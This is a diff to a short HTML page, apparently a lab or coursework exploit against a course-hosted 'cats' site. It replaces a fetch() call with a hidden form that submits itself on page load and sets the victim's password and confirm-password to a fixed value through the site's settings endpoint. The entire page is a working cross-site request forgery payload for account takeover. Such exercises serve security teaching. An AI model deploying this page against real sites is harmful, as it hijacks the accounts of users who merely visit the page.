@@ -1,14 +1,10 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <script>
-        fetch('https://cats.is-course.ru/settings', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'text/plain',
-            },
-            body: 'password=Qwerty123456789%21&confirm-password=Qwerty123456789%21'
-        });
-    </script>
+  <form action="https://cats.ru.is-course.ru/settings" method="POST" id="f">
+    <input name="password" value="Qwerty123456789!">
+    <input name="confirm-password" value="Qwerty123456789!">
+  </form>
+  <script>document.getElementById('f').submit();</script>
 </body>
 </html>
